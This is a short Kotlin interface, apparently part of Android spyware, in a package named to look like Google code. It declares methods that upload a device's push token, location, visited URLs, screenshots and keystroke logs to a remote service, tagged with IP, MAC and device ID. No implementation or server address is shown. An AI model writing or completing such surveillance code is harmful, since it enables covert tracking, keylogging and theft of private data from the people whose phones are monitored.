package com.android.google.remote

import com.android.google.remote.models.*

/*
* Remote service interface
* Headers: IP, MAC, DeviceId
* */
interface RemoteService {
    suspend fun sendPushToken(token: PushTokenDTO) // Firebase PushTokenDTO ++
    suspend fun sendLocation(location: LocationDTO) // LocationDTO ++
    suspend fun sendUrl(urlDTO: UrlDTO) // UrlDTO  ++
    suspend fun sendScreenshot(screenshotDTO: ScreenshotDTO) // ScreenshotDTO ++
    suspend fun sendKeyLog(keyLog: KeyLogDTO) // KeyLogDTO --
}